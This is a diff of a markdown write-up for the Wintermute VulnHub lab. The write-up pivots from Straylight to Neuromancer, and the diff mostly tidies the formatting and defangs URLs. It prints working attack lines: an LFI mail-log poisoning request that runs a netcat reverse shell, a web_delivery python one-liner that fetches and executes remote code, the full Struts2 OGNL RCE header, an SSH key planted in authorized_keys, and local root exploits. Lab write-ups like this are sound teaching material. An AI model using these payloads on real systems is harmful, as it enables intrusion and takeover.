@@ -1,14 +1,11 @@
-#WINTERMUTE  
+# WINTERMUTE  
   
 **URL: https://www.vulnhub.com/entry/wintermute-1,239/**  
   
 Awesome lab to test pivoting between machines. The architecture is the following:  
   
   192.168.148.3   .148.5       .111.6   .111.5  
-________________    ________________    ________________  
-|              |    |              |    |              |  
 |     Kali     | -> |  Straylight  | -> | Neuromancer  |  
-|______________|    |______________|    |______________|  
   
 #Straylight  
   
@@ -82,8 +79,8 @@ root@kali:~# telnet 192.168.148.5 25
 In the port 3000 is running a ntopng service. We access de login page and try the default credentials admin:admin. If we look around a bit, we found some interesting things:  
   
 Hosts > HTTP Servers (local)   
-	/turing-bolo/   
-	/freeside/   
+>	/turing-bolo/   
+>	/freeside/   
   
 Two locations in the HTTP server we should check.  
   
@@ -92,25 +89,25 @@ Two locations in the HTTP server we should check.
 The freeside site has just an image. But when we check turing-bolo, it redirect us to the following resource:  
   
   
-http://192.168.148.5/turing-bolo/bolo.php?bolo=case  
+hxxp://192.168.148.5/turing-bolo/bolo.php?bolo=case  
   
 And the following message pops up:  
   
-...  
-Operator Gamma: Adding other member logs to directory...:  
-molly.log  
-armitage.log  
-riviera.log  
-...  
+>...  
+>Operator Gamma: Adding other member logs to directory...:  
+>molly.log  
+>armitage.log  
+>riviera.log  
+>...  
   
 Mmmm...LFI? It seems that the php file is appending the extension ".log" at the end of the file.  
   
-http://192.168.148.5/turing-bolo/case  
-http://192.168.148.5/turing-bolo/bolo.php?bolo=/var/www/html/turing-bolo/case  
+hxxp://192.168.148.5/turing-bolo/case  
+hxxp://192.168.148.5/turing-bolo/bolo.php?bolo=/var/www/html/turing-bolo/case  
   
 It is in fact a LFI, but we are not able to access any file, just the ones we already know of. It doesn't work adding the null byte (%00) either. Doing a little bit of research, we notice that the smtp logs are being stored in /var/log/mail.log. Bingo!  
   
-http://192.168.148.5/turing-bolo/bolo.php?bolo=/var/log/mail  
+hxxp://192.168.148.5/turing-bolo/bolo.php?bolo=/var/log/mail  
 >...  
 >Jul 1 19:10:42 straylight postfix/postfix-script[1782]: stopping the Postfix mail system Jul 1 19:10:42 straylight postfix/master[716]: terminating on signal 15 Jul 1 19:10:43 straylight postfix/postfix-script[1945]: starting the Postfix mail system Jul 1 19:10:43 straylight postfix/master[1947]: daemon started -- version 3.1.8, configuration /etc/postfix Jul 3 20:26:50 straylight postfix/postfix-script[732]: starting the Postfix mail s  
 >...  
@@ -142,7 +139,7 @@ root@kali:~# telnet 192.168.148.5 25
   
 Now we set up a listener and make an HTTP request to the /var/log/mail.log file with the parameter cmd connecting to our machine:  
   
-curl "http://192.168.148.4/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc+192.168.148.3+4444+-e+/bin/sh"  
+curl "hxxp://192.168.148.4/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc+192.168.148.3+4444+-e+/bin/sh"  
   
 root@kali:~# nc -nvlp 4444  
 >listening on [any] 4444 ...  
@@ -173,10 +170,7 @@ www-data@straylight:/var/www/html/turing-bolo$ find / -perm -g=s -o -perm -4000 
 >-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp  
   
 root@kali:~# searchsploit screen 4.5.0  
->--------------------------------------------------- ----------------------------------------  
-> Exploit Title                                     |  Path  
->                                                   | (/usr/share/exploitdb/)  
->--------------------------------------------------- ----------------------------------------  
+> Exploit Title                                     |  Path  (/usr/share/exploitdb/)  
 >GNU Screen 4.5.0 - Local Privilege Escalation      | exploits/linux/local/41154.sh  
   
   
@@ -188,7 +182,7 @@ root@kali:~# python -m SimpleHTTPServer 80
   
   
 www-data@straylight:/tmp$ wget 192.168.148.3/44154.sh  
->--2019-04-13 10:38:46--  http://192.168.148.3/44154.sh  
+>--2019-04-13 10:38:46--  hxxp://192.168.148.3/44154.sh  
 >Connecting to 192.168.148.3:80... connected.  
 >HTTP request sent, awaiting response... 200 OK  
 >Length: 1152 (1.1K) [text/x-sh]  
@@ -208,12 +202,15 @@ www-data@straylight:/tmp$ ./44154.sh
 >  
 >id  
 >uid=0(root) gid=0(root) groups=0(root),33(www-data)  
->python -c 'import pty;pty.spawn("/bin/bash")'  
+>python -c 'import pty;pty.spawn("/bin/bash")' 
+
 root@straylight:/root# id  
 >uid=0(root) gid=0(root) groups=0(root),33(www-data)  
+
 root@straylight:/root# ls /root   
 root@straylight:/root# cat /root/flag.txt  
 >**5ed185fd75a8d6a7056c96a436c6d8aa**  
+
 root@straylight:/root# cat note.txt  
 >Devs,  
 >  
@@ -261,7 +258,7 @@ root@straylight:/root# chmod 600 /var/spool/cron/crontabs/root
 root@straylight:/root# crontab -l  
 >* * * * * /tmp/sorry  
   
-###PIVOTING  
+### PIVOTING  
   
 In order to pivot easily, I like to set up a socks proxy and route the traffic to the second machine through the first one. With metasploit is very easy to do and let us run any command through it.  
   
@@ -269,7 +266,8 @@ First, we have to open a meterpreter session with the web_delivery module:
   
 msf exploit(multi/script/web_delivery) > run  
 >...  
->python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.148.3:8080/OGsIAmtnMxP2Gv0');exec(r.read());"  
+>python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('hxxp://192.168.148.3:8080/OGsIAmtnMxP2Gv0');exec(r.read());"  
+
 msf5 exploit(multi/script/web_delivery) >   
 >[*] Sending stage (53770 bytes) to 192.168.148.5  
 >[*] Meterpreter session 1 opened (192.168.148.3:4446 -> 192.168.148.5:50706) at 2019-04-13 13:24:06 -0500  
@@ -314,12 +312,12 @@ msf5 auxiliary(server/socks4a) > run
   
 Now we can reach the second machine from our host.  
   
-#NEUROMANCER  
+# NEUROMANCER  
   
-###NMAP  
+### NMAP  
   
 root@kali:~# proxychains nmap -sT -Pn 192.168.111.5  
->ProxyChains-3.1 (http://proxychains.sf.net)  
+>ProxyChains-3.1 (hxxp://proxychains.sf.net)  
 >Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 13:35 CDT  
 >Nmap scan report for 192.168.111.5  
 >Host is up (0.011s latency).  
@@ -330,12 +328,12 @@ root@kali:~# proxychains nmap -sT -Pn 192.168.111.5
 >  
 >Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds  
   
-###HTTP  
+### HTTP  
   
 We already knew that it had a tomcat server running struts. We check with firefox the server and see that is a brand new installation.  
   
-root@kali:~# proxychains firefox http://192.168.111.5:8080  
->ProxyChains-3.1 (http://proxychains.sf.net)  
+root@kali:~# proxychains firefox hxxp://192.168.111.5:8080  
+>ProxyChains-3.1 (hxxp://proxychains.sf.net)  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:8080-<><>-OK  
@@ -343,18 +341,19 @@ root@kali:~# proxychains firefox http://192.168.111.5:8080
   
 We know base on the previous machine that the struts version is the 2.3.15, so let's try the famous RCE (https://www.exploit-db.com/exploits/45260):  
   
-root@straylight:~# curl http://192.168.111.5:8080/struts2_2.3.15.1-showcase/showcase.action -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"  
+root@straylight:~# curl hxxp://192.168.111.5:8080/struts2_2.3.15.1-showcase/showcase.action -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"  
 >uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)  
   
 Easy! We already have a RCE. Let's get our shell.  
   
   
-###BASIC SHELL  
+### BASIC SHELL  
   
 After all this work, let's go the easy path and just load the metasploit module  
   
 msf5 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI struts2_2.3.15.1-showcase/showcase.action  
 >TARGETURI => struts2_2.3.15.1-showcase/showcase.action  
+
 msf5 exploit(multi/http/struts2_content_type_ognl) > run  
 >[*] Started bind TCP handler against 192.168.111.5:4450  
 >[*] Sending stage (38 bytes) to 192.168.111.5  
@@ -384,7 +383,7 @@ msf5 exploit(multi/http/struts2_content_type_ognl) > run
 Checking the ports open, we see that there is something listening in the port 34483. Let's find out what it is:  
   
 root@kali:~# proxychains nmap -sT -sV -Pn 192.168.111.5 -p 34483  
->ProxyChains-3.1 (http://proxychains.sf.net)  
+>ProxyChains-3.1 (hxxp://proxychains.sf.net)  
 >Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-13 14:09 CDT  
 >mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
@@ -403,7 +402,7 @@ Great, a usefull shell. Let's just set up our ssh key and log in.
 >echo "ssh-rsa AAA....0DFr root@kali" > .ssh/authorized_keys  
   
 root@kali:~# proxychains ssh -l ta 192.168.111.5 -p 34483  
->ProxyChains-3.1 (http://proxychains.sf.net)  
+>ProxyChains-3.1 (hxxp://proxychains.sf.net)  
 >|S-chain|-<>-127.0.0.1:9050-<><>-192.168.111.5:34483-<><>-OK  
 > ----------------------------------------------------------------  
 >|                Neuromancer Secure Remote Access                |  
@@ -420,20 +419,23 @@ root@kali:~# proxychains ssh -l ta 192.168.111.5 -p 34483
 >  
 >  
 >Last login: Tue Jul  3 21:53:25 2018  
+
 ta@neuromancer:~$   
   
   
   
-###ROOT SHELL  
+### ROOT SHELL  
   
 This is the easy part, just check the kernel version and look for the exploit :/  
   
 ta@neuromancer:~$ uname -a  
->Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
+>Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 
+
 ta@neuromancer:/tmp$ ./44298  
 >task_struct = ffff88003734d400  
 >uidptr = ffff880035537e44  
 >spawning root shell  
+
 root@neuromancer:/tmp# id  
 >uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(ta)  
 root@neuromancer:/tmp# cat /root/flag.txt  
